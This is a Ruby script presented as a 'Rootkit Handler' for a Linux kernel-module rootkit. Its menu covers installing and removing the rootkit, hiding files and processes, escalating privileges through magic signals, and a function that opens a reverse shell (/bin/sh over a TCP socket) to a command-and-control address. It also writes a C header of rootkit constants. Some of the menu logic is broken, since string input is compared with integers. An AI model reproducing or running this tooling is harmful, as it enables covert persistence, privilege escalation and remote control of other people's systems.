system 'clear'
require 'colorize'
require 'socket'

puts <<-eos
   _______
  /\ o o o\
 /o \ o o o\_______
<    >------>   o /|
 \ o/  o   /_____/o|
  \/______/     |oo|
        |   o   |o/
        |_______|/  I used to roll the dice..
                   made by arthur & rodrigo

        Ruby
   Rootkit Handler\n    

1 - Install Ruby (Rootkit)
2 - Uninstall Ruby (Rootkit)
3 - Hide File
4 - Hide Process
5 - Privilege Escalation
6 - Reverse Shell (Ring3)

eos

def reverseShell(ip, port)
	spawn("/bin/sh",[:in,:out,:err]=>TCPSocket.new("#{ip}","#{port}"))
end

def writeLibrary(_rkname)
	rubyHeader = <<-eos
#define RTHXR "rthxr"
#define PF_INVISIBLE 0x10000000
#define MODULE_NAME "#{_rkname}"

struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	char d_name[1];
};

enum {
	SIGINVIS = 9,
	SIGSUPER = 2,
	SIGMODINVIS = 6,
};
	eos

	file = File.write("library/Ruby.h", rubyHeader)
	puts 'Done!'.bold
end

print 'Driver (Rootkit) Name: '
rkname = gets.chomp.to_s

print '\nRuby > '.bold
ruby = gets.chomp.to_s

if ruby == 1
	writeLibrary(rkname)

elsif ruby == 2 
	begin
		system 'kill -6 0'
		system "rmmod #{rkname}"
	rescue Exception => e
		puts "Error during Ruby (Rootkit) removal.. Err: " + e.message
	end

elsif ruby == 3
	print 'Directory/File Name: '
	flName = gets.chomp.to_s

	system "mv #{flName} rthxr#{flName}"

elsif ruby == 4
	begin
		print "Process \"PID\" ID: "
		pid = gets.chomp.to_s

		system "kill -9 #{pid}"
	rescue Exception => e
		puts "Error during Ruby (Rootkit) execution.. Err: " + e.message
	end

elsif ruby == 5
	begin
		system "kill -2 0"
	rescue Exception => e
		puts "Error during Ruby (Rootkit) execution.. Err: " + e.message
	end
elsif ruby == 6
	begin
		print 'Local (C2) Address: '
		laddr = gets.chomp.to_s

		print 'Local (C2) Port: '
		lport = gets.chomp.to_s

		reverseShell(laddr, lport)
	rescue Exception => e
		puts 'Error during Ruby (Rootkit) execution.. Err: ' + e.message
	end
end
